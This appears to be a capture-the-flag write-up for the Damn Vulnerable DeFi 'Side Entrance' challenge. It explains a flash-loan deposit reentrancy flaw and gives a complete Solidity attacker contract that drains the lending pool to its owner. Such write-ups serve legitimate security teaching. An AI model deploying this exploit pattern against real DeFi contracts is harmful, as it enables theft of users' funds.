# #4 Side Entrance Damn Vulnerable Defi

## Goals

=> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool

### Hints

- None

### Solution

- The vulnerability lies in the `flashLoan()` function which calls an external contract and calls the execute function.
- At first we need to deposit 1k ETH to the pool as the player. Through a malicious implementation of the execute function we can now perform a reentrancy attack and deposit the loaned tokens so we pass the if check + the balance of the player gets increased by the amount we passed into the `flashLoan()` function, we then only need to withdraw our balance which sould be 2k now (1k deposited + 1k deposited tokens which came from the flashLoan)

### Attacker Contract

```solidity
contract Hack {
    SideEntranceLenderPool targetContract;
    address owner = msg.sender;

    constructor(address _targetContract) {
        targetContract = SideEntranceLenderPool(_targetContract);
    }

    function attack(uint256 amount) external payable {
        // 1000 ether => 1000000000000000000000
        targetContract.flashLoan(amount);
    }

    function deposit(uint256 amount) external payable {
        targetContract.deposit{value: amount}();
    }

    function withdraw() external payable {
        targetContract.withdraw();
    }

    function execute() external payable {
        // reentrancy through this function deposit 1000 ether
        targetContract.deposit{value: 1000000000000000000000}();
    }

    function withdrawStolenFunds() external {
        // since we did perform a reentrancy
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
```
